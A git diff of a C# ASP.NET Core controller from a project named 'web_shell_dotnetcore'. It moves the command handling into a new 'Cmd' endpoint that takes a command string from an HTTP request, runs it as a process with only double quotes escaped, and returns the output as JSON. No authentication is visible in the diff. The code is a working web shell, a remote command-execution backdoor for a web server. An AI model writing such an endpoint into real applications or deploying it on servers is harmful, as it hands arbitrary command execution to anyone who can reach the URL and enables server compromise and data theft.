@@ -8,6 +8,7 @@ using Microsoft.AspNetCore.Mvc.Rendering;
 using Microsoft.EntityFrameworkCore;
 using web_shell_dotnetcore;
 using web_shell_dotnetcore.Models;
+using Newtonsoft.Json;
 
 namespace web_shell_dotnetcore.Controllers
 {
@@ -21,9 +22,14 @@ namespace web_shell_dotnetcore.Controllers
         }
 
         // GET: PowerShellCMs
-        public IActionResult Index(string cmd)
+        public IActionResult Index()
         {
-            string result = "", error = "";
+            return View();
+        }
+
+        public JsonResult Cmd(string cmd)
+        {
+            string result, error;
             var escapedArgs = cmd.Replace("\"", "\\\"");
             var process = new Process()
             {
@@ -41,17 +47,12 @@ namespace web_shell_dotnetcore.Controllers
             result = process.StandardOutput.ReadToEnd();
             error = process.StandardError.ReadToEnd();
             process.WaitForExit();
-            ViewBag.res = error == "" ? result : error;
-            
 
-            return View();
+            return new JsonResult(result)
+            {
+                StatusCode = 200
+            };
         }
 
-        
-
-        private bool PowerShellCMExists(int id)
-        {
-            return _context.PSCommands.Any(e => e.Id == id);
-        }
     }
 }
